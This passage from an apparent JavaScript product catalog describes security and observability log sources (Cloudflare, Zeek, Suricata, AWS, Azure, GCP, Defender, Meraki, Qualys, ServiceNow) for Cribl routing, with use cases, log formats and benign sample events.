        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Google Chronicle', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'REST API (Cloud Log Shipper) / Syslog / Cloud-to-Cloud connector',
        logFormat: 'JSON — fields include timestamp, user, src_location, dst_location, app, activity, object, alert_type, dlp_profile, severity, risk_level, category, ccl, cci, url, bytes_uploaded, bytes_downloaded, traffic_type.',
        avgEPS: '1,000-50,000 EPS depending on user count and inline vs API deployment',
        sampleEvent: '{"timestamp":"2026-06-11T14:32:08Z","type":"page","user":"jperks@cribl.io","src_ip":"203.0.113.42","src_country":"US","dst_country":"US","app":"Microsoft OneDrive","category":"Cloud Storage","ccl":"excellent","activity":"Upload","object":"roadmap-2026.xlsx","bytes_uploaded":85000000,"severity":"low","alert":"no","dlp_profile":"","policy":"Allow Cloud Storage","traffic_type":"CloudApp"}'
      },
      {
        id: 'cloudflare',
        name: 'Cloudflare HTTP & Firewall Logs',
        vendor: 'Cloudflare',
        description: 'Edge network logs from Cloudflare covering HTTP requests, WAF events, bot management decisions, DDoS mitigation, DNS queries, and Zero Trust access. Delivered via Logpush to cloud storage or HTTP endpoint.',
        status: 'available',
        useCases: ['DDoS Mitigation', 'WAF Monitoring', 'Bot Management', 'DNS Security', 'Performance Monitoring', 'Zero Trust Access', 'CDN Analytics'],
        personas: ['Security Engineering', 'SOC', 'Platform Engineering', 'NOC', 'DevOps'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for WAF bypass attempts, credential stuffing, API abuse, and DDoS attack patterns from Cloudflare edge logs' },
            { persona: 'Data End User / Analyst', job: 'Analyze bot traffic patterns and WAF rule effectiveness to tune protection policies' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor origin server health, cache hit ratios, and edge latency to optimize CDN configuration' },
            { persona: 'Data End User / Analyst', job: 'Track request rates, error ratios, and bandwidth by zone to detect performance degradation' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter Cloudflare logs to route only security events (WAF blocks, challenges, bot detections) to SIEM while sending full request logs to Lake' },
            { persona: 'Data Engineer', job: 'Reduce SIEM ingest cost by 70% by suppressing 200-status cached requests and retaining only actionable security and error events' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Cloudflare Logpush to S3/GCS and set up Cribl Stream pull to parse and route within 45 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Elastic Security', 'Datadog', 'Google Chronicle', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Logpush (S3/GCS/Azure Blob/HTTP endpoint) / REST API',
        logFormat: 'JSON (NDJSON) — fields include ClientIP, ClientRequestHost, ClientRequestURI, EdgeResponseStatus, WAFAction, WAFRuleID, BotScore, BotManagementDecision, CacheCacheStatus, EdgeStartTimestamp, OriginResponseTime.',
        avgEPS: '10,000-1,000,000+ EPS depending on traffic volume and log types enabled',
        sampleEvent: '{"ClientIP":"203.0.113.42","ClientRequestHost":"app.example.com","ClientRequestMethod":"GET","ClientRequestURI":"/api/users","EdgeResponseStatus":200,"EdgeStartTimestamp":"2026-06-11T14:32:08Z","CacheCacheStatus":"hit","WAFAction":"allow","WAFRuleID":"","BotScore":2,"BotManagementDecision":"allow","OriginResponseTime":45000,"EdgeEndTimestamp":"2026-06-11T14:32:08.045Z"}'
      }
    ]
  },
  {
    category: 'IDS / Network Security',
    icon: '🔍',
    sources: [
      {
        id: 'zeek-logs',
        name: 'Zeek (Bro) Network Logs',
        vendor: 'Zeek Project (Open Source)',
        description: 'Passive network traffic analysis logs from Zeek sensors covering connections (conn.log), DNS queries (dns.log), HTTP transactions (http.log), SSL/TLS sessions (ssl.log), file transfers (files.log), and protocol-specific analyzers. Tab-separated or JSON format.',
        status: 'available',
        useCases: ['Network Detection & Response', 'Threat Hunting', 'Lateral Movement Detection', 'DNS Tunneling Detection', 'Certificate Monitoring', 'Protocol Anomaly Detection', 'Forensic Analysis'],
        personas: ['Security Engineering', 'SOC', 'Threat Hunting', 'Incident Response', 'Network Security'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for lateral movement, DNS tunneling, beaconing behavior, and JA3/JA3S fingerprint matches using structured Zeek fields' },
            { persona: 'Data End User / Analyst', job: 'Hunt for anomalous connections using conn.log duration, byte ratios, and unusual port/protocol combinations' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Reduce Zeek conn.log volume by 60-80% by filtering local broadcast, DNS responses, and short-lived ephemeral connections while preserving long-duration and high-byte flows' },
            { persona: 'Data Engineer', job: 'Route Zeek notice.log and weird.log directly to SIEM while conn.log goes to Lake with sampled subsets to SIEM for baseline analytics' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor network throughput, connection counts, and protocol distribution trends from Zeek conn.log metadata' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Parse Zeek TSV and JSON output formats and configure per-log-type routing rules within 30 minutes using pack pipelines' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Elastic Security', 'Microsoft Sentinel', 'Google Chronicle', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'File monitor (Cribl Edge) / Syslog / Kafka / Direct file ingest',
        logFormat: 'TSV (tab-separated) or JSON. Key log types: conn.log (uid, id.orig_h, id.resp_h, id.resp_p, proto, duration, orig_bytes, resp_bytes), dns.log (query, qtype, answers), http.log (method, host, uri, status_code), ssl.log (server_name, subject, ja3, ja3s), notice.log (note, msg, src, dst).',
        avgEPS: '10,000-500,000 EPS depending on network throughput and enabled analyzers',
        sampleEvent: '{"ts":"2026-06-11T14:32:08.000000Z","uid":"CYF1xz3qOViQKLMwXe","id.orig_h":"10.0.1.50","id.orig_p":52341,"id.resp_h":"203.0.113.100","id.resp_p":443,"proto":"tcp","service":"ssl","duration":45.2,"orig_bytes":15000,"resp_bytes":89000,"conn_state":"SF","missed_bytes":0,"history":"ShADadFf","orig_pkts":25,"resp_pkts":20,"ja3":"a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6","ja3s":"b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7"}'
      },
      {
        id: 'suricata-ids',
        name: 'Suricata IDS/IPS Alerts',
        vendor: 'Open Information Security Foundation (OISF)',
        description: 'Network intrusion detection and prevention alerts from Suricata in EVE JSON format. Covers signature-based detection, protocol anomalies, DNS events, TLS metadata, file extraction, and flow records. Compatible with Emerging Threats and Snort rule sets.',
        status: 'available',
        useCases: ['Intrusion Detection', 'Signature-Based Threat Detection', 'Protocol Anomaly Detection', 'File Extraction', 'Network Forensics', 'Compliance Monitoring', 'Lateral Movement Detection'],
        personas: ['Security Engineering', 'SOC', 'Network Security', 'Incident Response', 'Threat Hunting'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Correlate Suricata alert signatures with flow data and DNS events to build high-confidence composite detections' },
            { persona: 'Data End User / Analyst', job: 'Investigate IDS alerts by pivoting from signature match to full session context including DNS, TLS, and file metadata' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter noisy informational alerts (severity 3) and DNS query logs while preserving all severity 1-2 alerts and file extraction events for SIEM' },
            { persona: 'Data Engineer', job: 'Route alert events to SIEM and flow/protocol metadata to Lake, reducing SIEM volume by 75% while maintaining full forensic capability' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Suricata sensor health, dropped packets, and rule processing latency to ensure detection coverage' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Ingest Suricata EVE JSON via file monitor or syslog and configure alert-priority routing within 20 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Elastic Security', 'Microsoft Sentinel', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'File monitor (eve.json) / Syslog / Redis / Kafka',
        logFormat: 'EVE JSON — event_type field determines schema: alert (signature, severity, category), dns (rrname, rrtype, rcode), tls (subject, issuer, ja3), http (hostname, url, method), flow (bytes_toserver, bytes_toclient, pkts).',
        avgEPS: '5,000-200,000 EPS depending on network throughput, rule count, and event types enabled',
        sampleEvent: '{"timestamp":"2026-06-11T14:32:08.000000+0000","flow_id":1234567890,"event_type":"alert","src_ip":"185.220.101.33","src_port":44100,"dest_ip":"10.0.1.50","dest_port":22,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2024792,"rev":3,"signature":"ET SCAN SSH Brute Force Attempt","category":"Attempted Administrator Privilege Gain","severity":1},"flow":{"pkts_toserver":15,"pkts_toclient":12,"bytes_toserver":4500,"bytes_toclient":3800,"start":"2026-06-11T14:32:00.000000+0000"}}'
      }
    ]
  },
  {
    category: 'Cloud Infrastructure',
    icon: '🏗️',
    sources: [
      {
        id: 'aws-cloudtrail',
        name: 'AWS CloudTrail',
        vendor: 'Amazon Web Services',
        description: 'API activity logs for AWS accounts capturing every API call made via the console, CLI, SDKs, and services. Records who made the call, from where, what was requested, and the response. Essential for security monitoring, compliance auditing, and operational troubleshooting.',
        status: 'available',
        useCases: ['API Security Monitoring', 'Privilege Escalation Detection', 'Resource Change Tracking', 'Compliance Auditing', 'Incident Investigation', 'Cost Attribution', 'Unauthorized Access Detection'],
        personas: ['Cloud Security', 'SOC', 'DevOps', 'Platform Engineering', 'Compliance', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for IAM privilege escalation, unauthorized resource access, security group modifications, and credential compromise indicators' },
            { persona: 'Data End User / Analyst', job: 'Investigate suspicious API activity by correlating source IP, user identity, and resource targets across CloudTrail events' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress high-volume read-only API calls (Describe*, List*, Get*) and KMS decrypt events, reducing CloudTrail volume by 70-85% while preserving all mutating and auth events' },
            { persona: 'Data Engineer', job: 'Route security-critical events (ConsoleLogin failures, IAM changes, S3 policy modifications) to SIEM while sending full CloudTrail to Lake for compliance retention' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain 365-day CloudTrail retention with tamper-proof storage in Lake to satisfy SOC 2 and PCI-DSS audit requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate compliance reports showing all IAM policy changes, root account usage, and cross-account access within any time window' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure S3-SQS source for CloudTrail ingestion and set up event-type-based routing within 30 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Google Chronicle', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'S3 + SQS / CloudWatch Logs / EventBridge / Direct S3 pull',
        logFormat: 'JSON — fields include eventTime, eventSource, eventName, awsRegion, sourceIPAddress, userIdentity (type, arn, accountId), requestParameters, responseElements, errorCode, errorMessage, readOnly, eventType.',
        avgEPS: '10,000-1,000,000+ EPS depending on account count, service usage, and data event logging',
        sampleEvent: '{"eventVersion":"1.09","userIdentity":{"type":"IAMUser","principalId":"AIDA1234567890EXAMPLE","arn":"arn:aws:iam::123456789012:user/jperks","accountId":"123456789012","userName":"jperks"},"eventTime":"2026-06-11T14:32:08Z","eventSource":"iam.amazonaws.com","eventName":"CreateUser","awsRegion":"us-east-1","sourceIPAddress":"203.0.113.42","userAgent":"console.amazonaws.com","requestParameters":{"userName":"new-service-account"},"responseElements":{"user":{"userName":"new-service-account","userId":"AIDA0987654321EXAMPLE"}}}'
      },
      {
        id: 'aws-cloudwatch',
        name: 'AWS CloudWatch Logs',
        vendor: 'Amazon Web Services',
        description: 'Application and infrastructure logs from AWS services including Lambda functions, ECS containers, API Gateway, RDS, and custom applications. Structured and unstructured log streams organized by log groups.',
        status: 'available',
        useCases: ['Application Monitoring', 'Error Tracking', 'Performance Analysis', 'Lambda Function Debugging', 'Container Observability', 'API Gateway Monitoring', 'Custom Metric Extraction'],
        personas: ['DevOps', 'Platform Engineering', 'SRE', 'Application Development', 'NOC'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Reduce CloudWatch Logs volume by 50-70% by filtering debug-level Lambda logs and retaining only errors, warnings, and cold starts for SIEM/observability platforms' },
            { persona: 'Data Engineer', job: 'Extract metrics from unstructured log lines (latency, error counts, memory usage) and route to metrics platforms while sending raw logs to Lake' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Lambda cold start rates, timeout errors, and memory utilization trends across all functions' },
            { persona: 'Data End User / Analyst', job: 'Trace API Gateway 5xx errors to downstream Lambda failures and identify root cause within 5 minutes' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for unauthorized API calls, unusual Lambda invocation patterns, and application-layer attack indicators in custom app logs' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure CloudWatch Logs subscription filter to Kinesis Firehose and connect to Cribl Stream for multi-destination routing' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['Splunk', 'Datadog', 'New Relic', 'Dynatrace', 'Elastic', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'CloudWatch Logs Subscription Filter → Kinesis Firehose / S3 + SQS / Lambda forwarder',
        logFormat: 'Mixed — JSON (structured app logs, API Gateway), plain text (Lambda stdout), CloudWatch Logs Insights format. Key metadata: logGroup, logStream, timestamp, message.',
        avgEPS: '50,000-5,000,000+ EPS depending on application count and log verbosity',
        sampleEvent: '{"logGroup":"/aws/lambda/api-handler","logStream":"2026/06/11/[$LATEST]abc123","timestamp":1718107928000,"message":"START RequestId: e1a2b3c4-d5e6-f7a8 Version: $LATEST\\nINFO: Processing request for user jperks, method=GET path=/api/users duration=45ms\\nEND RequestId: e1a2b3c4-d5e6-f7a8\\nREPORT RequestId: e1a2b3c4-d5e6-f7a8 Duration: 45.23 ms Billed Duration: 46 ms Memory Size: 256 MB Max Memory Used: 128 MB Init Duration: 234.56 ms"}'
      },
      {
        id: 'azure-activity',
        name: 'Azure Activity & Monitor Logs',
        vendor: 'Microsoft Azure',
        description: 'Azure platform activity logs capturing subscription-level operations (resource creation, deletion, modification), Azure AD sign-in events, resource health changes, and service health notifications. Equivalent to AWS CloudTrail for Azure environments.',
        status: 'available',
        useCases: ['Resource Change Tracking', 'Access Monitoring', 'Compliance Auditing', 'Cost Attribution', 'Service Health Monitoring', 'Privilege Escalation Detection', 'Policy Compliance'],
        personas: ['Cloud Security', 'SOC', 'DevOps', 'Platform Engineering', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for role assignment changes, NSG modifications, key vault access anomalies, and storage account exposure' },
            { persona: 'Data End User / Analyst', job: 'Investigate unauthorized resource modifications by correlating caller identity, IP address, and operation details' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume read operations and health check polls while preserving write operations and authentication events for SIEM' },
            { persona: 'Data Engineer', job: 'Route security-critical categories (Administrative, Security, Policy) to SIEM and full activity log to Lake for compliance' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete audit trail of all Azure resource modifications for SOC 2 and regulatory compliance' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Azure Event Hub export for Activity Logs and connect to Cribl Stream for parsing and routing' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['Microsoft Sentinel', 'Splunk', 'CrowdStrike NG SIEM', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Azure Event Hub / Azure Monitor Diagnostic Settings / REST API',
        logFormat: 'JSON — fields include time, resourceId, operationName, category, resultType, callerIpAddress, identity, properties. Categories: Administrative, Security, ServiceHealth, Alert, Recommendation, Policy, Autoscale, ResourceHealth.',
        avgEPS: '5,000-500,000 EPS depending on subscription count and resource activity',
        sampleEvent: '{"time":"2026-06-11T14:32:08Z","resourceId":"/subscriptions/a1b2c3d4/resourceGroups/prod-rg/providers/Microsoft.Compute/virtualMachines/web-server-01","operationName":"Microsoft.Compute/virtualMachines/write","category":"Administrative","resultType":"Success","callerIpAddress":"203.0.113.42","identity":{"claims":{"name":"Jordan Perks","upn":"jperks@contoso.com"}},"properties":{"statusCode":"OK","serviceRequestId":"e1a2b3c4-d5e6-f7a8"}}'
      },
      {
        id: 'gcp-audit-logs',
        name: 'GCP Cloud Audit Logs',
        vendor: 'Google Cloud Platform',
        description: 'Google Cloud audit logs capturing Admin Activity (always-on), Data Access (configurable), System Events, and Policy Denied events across all GCP services. Essential for security monitoring and compliance in GCP environments.',
        status: 'available',
        useCases: ['API Security Monitoring', 'Data Access Tracking', 'Compliance Auditing', 'Privilege Escalation Detection', 'Resource Change Monitoring', 'Service Account Abuse Detection'],
        personas: ['Cloud Security', 'SOC', 'DevOps', 'Platform Engineering', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for service account key creation, IAM policy changes, firewall rule modifications, and unusual data access patterns' },
            { persona: 'Data End User / Analyst', job: 'Investigate suspicious GCP API activity by correlating principal email, source IP, and method across audit log entries' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume Data Access audit logs (storage.objects.get, bigquery.jobs.get) reducing volume by 80%+ while preserving Admin Activity and Policy Denied events' },
            { persona: 'Data Engineer', job: 'Route Admin Activity logs to SIEM in real-time while batching Data Access logs to Lake for on-demand forensic queries' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain tamper-proof audit trail of all GCP administrative actions for FedRAMP and SOC 2 compliance' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure GCP log sink to Pub/Sub and connect Cribl Stream pull source for parsing and multi-destination routing' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['Google Chronicle', 'Splunk', 'CrowdStrike NG SIEM', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Pub/Sub subscription / Cloud Storage sink / BigQuery export',
        logFormat: 'JSON — fields include protoPayload.methodName, protoPayload.serviceName, protoPayload.authenticationInfo.principalEmail, protoPayload.requestMetadata.callerIp, resource.type, resource.labels, severity, logName.',
        avgEPS: '5,000-500,000 EPS depending on project count and Data Access logging configuration',
        sampleEvent: '{"protoPayload":{"@type":"type.googleapis.com/google.cloud.audit.v1.AuditLog","serviceName":"iam.googleapis.com","methodName":"google.iam.admin.v1.CreateServiceAccountKey","authenticationInfo":{"principalEmail":"jperks@cribl.io"},"requestMetadata":{"callerIp":"203.0.113.42","callerSuppliedUserAgent":"google-cloud-sdk gcloud/450.0.0"},"resourceName":"projects/-/serviceAccounts/automation@project-123.iam.gserviceaccount.com/keys/key-id-123"},"resource":{"type":"service_account","labels":{"project_id":"project-123","email_id":"automation@project-123.iam.gserviceaccount.com"}},"severity":"NOTICE","logName":"projects/project-123/logs/cloudaudit.googleapis.com%2Factivity","receiveTimestamp":"2026-06-11T14:32:08Z"}'
      }
    ]
  },
  {
    category: 'Endpoint (Additional)',
    icon: '💻',
    sources: [
      {
        id: 'microsoft-defender-endpoint',
        name: 'Microsoft Defender for Endpoint (MDE)',
        vendor: 'Microsoft',
        description: 'Enterprise endpoint detection and response logs from Microsoft Defender for Endpoint covering alerts, device events, advanced hunting telemetry, vulnerability assessments, and automated investigation results. Integrated with Microsoft 365 Defender.',
        status: 'available',
        useCases: ['Endpoint Threat Detection', 'Vulnerability Management', 'Automated Investigation', 'Threat Hunting', 'Device Compliance', 'Incident Response', 'Attack Surface Reduction'],
        personas: ['SOC', 'Security Engineering', 'Incident Response', 'Threat Hunting', 'Endpoint Security'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Enrich MDE alerts with network context and correlate across endpoint, identity, and email telemetry for composite detections' },
            { persona: 'Data End User / Analyst', job: 'Investigate MDE alerts using advanced hunting data including process trees, network connections, and file modifications' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume device telemetry events (registry reads, benign process creation) reducing MDE volume by 60-75% while preserving alerts and suspicious activity' },
            { persona: 'Data Engineer', job: 'Route MDE alerts and high-severity events to SIEM while sending raw device telemetry to Lake for threat hunting queries' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor MDE sensor health, onboarding status, and detection coverage gaps across the device fleet' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Microsoft 365 Defender streaming API to Event Hub and connect to Cribl Stream for multi-destination routing' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['Microsoft Sentinel', 'CrowdStrike NG SIEM', 'Splunk', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Microsoft 365 Defender Streaming API → Event Hub / REST API (Advanced Hunting) / SIEM Agent',
        logFormat: 'JSON — tables include AlertInfo, AlertEvidence, DeviceProcessEvents, DeviceNetworkEvents, DeviceFileEvents, DeviceRegistryEvents, DeviceLogonEvents. Key fields: Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine, RemoteIP.',
        avgEPS: '10,000-500,000 EPS depending on device count and telemetry level (basic vs advanced)',
        sampleEvent: '{"Timestamp":"2026-06-11T14:32:08Z","DeviceId":"abc123def456","DeviceName":"DESKTOP-JP01","ActionType":"ProcessCreated","FileName":"powershell.exe","FolderPath":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0","ProcessCommandLine":"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\\\Scripts\\\\backup.ps1","InitiatingProcessFileName":"explorer.exe","AccountName":"jperks","AccountDomain":"CORP","RemoteIP":"","RemotePort":0,"AlertId":"","ThreatFamily":""}'
      }
    ]
  },
  {
    category: 'Network Infrastructure',
    icon: '🌐',
    sources: [
      {
        id: 'cisco-meraki',
        name: 'Cisco Meraki Security & Event Logs',
        vendor: 'Cisco Meraki',
        description: 'Cloud-managed network logs from Meraki MX security appliances, MR access points, and MS switches. Covers security events (IDS/IPS, malware, content filtering), client connectivity, system events, and air marshal wireless threat detection.',
        status: 'available',
        useCases: ['Branch Security Monitoring', 'Wireless Threat Detection', 'Content Filtering', 'Client Connectivity', 'IDS/IPS Alerting', 'Device Inventory', 'Network Performance'],
        personas: ['NOC', 'Security Engineering', 'SOC', 'Network Engineering', 'Branch IT'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for rogue AP activity, IDS signature matches, malware downloads, and content filter bypass attempts across Meraki MX fleet' },
            { persona: 'Data End User / Analyst', job: 'Investigate wireless threats detected by Air Marshal and correlate with client identity for containment' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Meraki device health, client counts, and link utilization across distributed branch locations from a single pane' },
            { persona: 'Data End User / Analyst', job: 'Track WiFi client roaming patterns, association failures, and signal quality to optimize AP placement' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume client association and URL log events while preserving security events and system alerts for SIEM routing' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Meraki syslog export and parse space-delimited event format for multi-destination routing within 20 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (UDP/TCP) / Meraki API / Webhook',
        logFormat: 'Syslog — space-delimited fields with epoch timestamp. Format: <timestamp> <device_serial> <log_type> <event_data>. Log types: security_event, urls, flows, ids-alerts, air_marshal, events.',
        avgEPS: '500-50,000 EPS per site depending on client count and logging configuration',
        sampleEvent: '1718107928.123456789 Q2HP-ABCD-1234 security_event ids_alerted signature=1:2024792:3 priority=1 timestamp=1718107928.123 dhost=AA:BB:CC:DD:EE:FF direction=ingress protocol=tcp/22 src=185.220.101.33:44100 dst=10.0.1.50:22 message="ET SCAN SSH Brute Force Attempt"'
      }
    ]
  },
  {
    category: 'Vulnerability Management',
    icon: '🔬',
    sources: [
      {
        id: 'qualys-tenable',
        name: 'Qualys / Tenable Vulnerability Scan Results',
        vendor: 'Qualys / Tenable',
        description: 'Vulnerability assessment scan results from Qualys VMDR or Tenable.io/Nessus covering host vulnerabilities, compliance checks, software inventory, and remediation status. Provides CVE-level detail with CVSS scoring and fix availability.',
        status: 'available',
        useCases: ['Vulnerability Prioritization', 'Patch Management', 'Compliance Reporting', 'Attack Surface Reduction', 'Risk Scoring', 'SLA Tracking', 'Remediation Workflow'],
        personas: ['Security Engineering', 'Vulnerability Management', 'Compliance', 'Platform Engineering', 'SOC'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Correlate active vulnerabilities with threat intelligence and network exposure to prioritize exploitable findings over theoretical risk' },
            { persona: 'Data End User / Analyst', job: 'Identify hosts with critical unpatched vulnerabilities exposed to the internet for emergency remediation' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Generate vulnerability SLA compliance reports showing mean time to remediation by severity and business unit' },
            { persona: 'Data End User / Analyst', job: 'Track vulnerability trends over time and demonstrate risk reduction to leadership' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Deduplicate vulnerability findings across overlapping scan schedules and suppress informational findings, reducing data volume by 40-60%' },
            { persona: 'Data Engineer', job: 'Route critical and high findings to SIEM for correlation while sending full scan results to Lake for compliance retention' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Qualys/Tenable API integration to pull scan results on schedule and normalize to common vulnerability schema' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'ServiceNow', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'REST API (scheduled pull) / Webhook / File export (CSV/XML)',
        logFormat: 'JSON or XML — fields include host_ip, hostname, os, qid/plugin_id, cve, cvss_base, cvss_temporal, severity, title, solution, first_found, last_found, status, port, protocol, service.',
        avgEPS: '100-10,000 EPS (bursty — high volume during scan windows, near-zero between scans)',
        sampleEvent: '{"scan_id":"scan-2026-06-11-001","host_ip":"10.0.1.50","hostname":"web-server-01","os":"Ubuntu 22.04 LTS","qid":376148,"cve":"CVE-2026-1234","cvss_base":9.8,"cvss_temporal":8.5,"severity":5,"title":"OpenSSL Buffer Overflow - Remote Code Execution","solution":"Update OpenSSL to version 3.1.5 or later","port":443,"protocol":"tcp","service":"https","first_found":"2026-06-01T00:00:00Z","last_found":"2026-06-11T14:32:08Z","status":"Active","exploitability":"Exploit Available"}'
      }
    ]
  },
  {
    category: 'ITSM / CMDB',
    icon: '📋',
    sources: [
      {
        id: 'servicenow',
        name: 'ServiceNow CMDB & Incident Events',
        vendor: 'ServiceNow',
        description: 'Configuration management and incident lifecycle events from ServiceNow covering CI changes, incident creation/updates, change requests, and CMDB relationship modifications. Enables correlation of security events with asset context and change windows.',
        status: 'available',
        useCases: ['Asset Context Enrichment', 'Change Correlation', 'Incident Automation', 'CMDB Accuracy', 'SLA Monitoring', 'Risk Assessment', 'Impact Analysis'],
        personas: ['SOC', 'Platform Engineering', 'Security Engineering', 'IT Operations', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Enrich security alerts with CMDB context (asset owner, business criticality, environment) for automated priority scoring and routing' },
            { persona: 'Data End User / Analyst', job: 'Correlate detected threats with recent change requests to distinguish authorized maintenance from unauthorized access' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Track CMDB accuracy by comparing discovered assets against registered CIs and flagging shadow IT' },
            { persona: 'Data End User / Analyst', job: 'Monitor incident volume, MTTR, and SLA compliance trends by service and priority' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Engineer', job: 'Use ServiceNow CMDB as a lookup source to enrich events in-flight, adding asset owner and criticality without storing duplicate data' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure ServiceNow REST API integration for CMDB and incident table exports to Cribl Stream for enrichment and routing' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'REST API (Table API / CMDB API) / MID Server / Event-driven webhook',
